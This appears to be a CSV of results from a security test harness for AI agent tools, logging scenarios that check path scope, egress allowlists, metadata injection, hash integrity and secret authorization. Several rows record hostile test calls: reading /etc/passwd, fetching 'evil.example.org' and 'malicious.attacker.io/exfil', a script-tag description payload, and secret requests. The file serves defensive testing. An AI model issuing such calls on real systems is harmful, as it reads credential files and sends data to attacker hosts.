scenario_id,violating,detected,gt_component,gt_lifecycle_phase,expected_evidence_kind,false_positive,predicted_component,predicted_phase,localization_correct,baseline_component,baseline_phase,produced_evidence_kind,produced_evidence_path,evidence_found,tool_called,tool_args,tool_response,error,timestamp
S1,True,True,scope,runtime,policy_violation,False,scope,runtime,True,scope,runtime,policy_violation,evidence\traces\S1_20260315_224515_policy_violation.json,True,read_file,"{""path"": ""/etc/passwd""}",POLICY_VIOLATION: path '/etc/passwd' uses absolute or traversal pattern,,2026-03-15T22:45:15.038200+00:00
S2,True,True,scope,runtime,policy_violation,False,scope,runtime,True,scope,runtime,policy_violation,evidence\traces\S2_20260315_224515_policy_violation.json,True,fetch_url,"{""url"": ""https://evil.example.org/data""}","POLICY_VIOLATION: host 'evil.example.org' not in egress allowlist {'httpbin.org', 'example.com'}",,2026-03-15T22:45:15.282915+00:00
S3,True,True,metadata,discovery,metadata_violation,False,metadata,discovery,True,metadata,discovery,metadata_violation,evidence\traces\S3_20260315_224515_metadata_violation.json,True,metadata_check,"{""description"": ""<script>alert(1)</script> Read a file""}",METADATA_VIOLATION: disallowed pattern '<script' in description,,2026-03-15T22:45:15.855582+00:00
S4,True,True,integrity,admission,hash_mismatch,False,integrity,admission,True,integrity,admission,hash_mismatch,evidence\traces\S4_20260315_224516_hash_mismatch.json,True,integrity_check,"{""resource_uri"": ""tool-integrity://hash""}",HASH_MISMATCH: expected=WRONG_HASH_AAAA1111 actual=b36370a474ddd8d7c8d2304d41e4f33720c42db8a7b8ba0849655fe1f7479f13,,2026-03-15T22:45:16.451807+00:00
S5,True,True,authz,runtime,authz_denied,False,authz,runtime,True,authz,runtime,policy_violation,evidence\traces\S5_20260315_224516_policy_violation.json,True,get_secret,"{""key"": ""db_password""}","AUTHZ_DENIED: scope 'read:secrets' required, principal 'user2' has [read:metrics]",,2026-03-15T22:45:16.682765+00:00
S6,True,True,authz,runtime,authz_denied,False,authz,runtime,True,authz,runtime,,,False,,{},,"HTTPStatusError: Client error '403 Forbidden' for url 'http://127.0.0.1:8002/mcp'
For more information check: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403",2026-03-15T22:45:16.843022+00:00
S7,True,True,integrity,admission,hash_mismatch,False,integrity,admission,True,integrity,admission,hash_mismatch,evidence\traces\S7_20260315_224517_hash_mismatch.json,True,integrity_check,"{""resource_uri"": ""tool-integrity://hash""}",HASH_MISMATCH: expected=APPROVED_HASH_CCCC3333 actual=b36370a474ddd8d7c8d2304d41e4f33720c42db8a7b8ba0849655fe1f7479f13,,2026-03-15T22:45:17.352402+00:00
S8,True,True,observability,observability,observability_gap,False,observability,observability,True,observability,observability,observability_gap,evidence\traces\S8_20260315_224517_observability_gap.json,True,fetch_url,"{""url"": ""https://malicious.attacker.io/exfil""}",OBSERVABILITY_GAP: no server-side denial trace found for S8,,2026-03-15T22:45:17.564810+00:00
S11,True,True,integrity,runtime,hash_mismatch,False,integrity,runtime,True,integrity,admission,hash_mismatch,evidence\traces\S11_20260315_224518_hash_mismatch.json,True,integrity_check,"{""resource_uri"": ""tool-integrity://hash""}",HASH_MISMATCH: expected=RUNTIME_DRIFT_HASH_9999 actual=b36370a474ddd8d7c8d2304d41e4f33720c42db8a7b8ba0849655fe1f7479f13,,2026-03-15T22:45:18.100117+00:00
S12,True,True,scope,runtime,authz_denied,False,scope,runtime,True,authz,runtime,policy_violation,evidence\traces\S12_20260315_224518_policy_violation.json,True,get_secret,"{""key"": ""api_key""}","AUTHZ_DENIED: scope 'read:secrets' required, principal 'user2' has [read:metrics]",,2026-03-15T22:45:18.318466+00:00
S9,False,False,scope,runtime,clean_execution,False,,,False,,,,,False,read_file,"{""path"": ""hello.txt""}",Hello from sandbox!,,2026-03-15T22:45:18.887987+00:00
S10,False,False,authz,runtime,clean_execution,False,,,False,,,,,False,get_secret,"{""key"": ""db_password""}",hunter2,,2026-03-15T22:45:19.105372+00:00
